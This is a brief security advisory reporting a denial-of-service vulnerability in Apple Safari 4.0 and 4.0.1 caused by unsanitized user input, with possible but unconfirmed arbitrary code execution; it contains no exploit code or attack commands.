Apple Safari is prone to a denial-of-service vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users.
Given the nature of this issue, the attacker may also be able to run arbitrary code, but this has not been confirmed.

Safari 4.0 and 4.0.1 are vulnerable; other versions may also be affected.
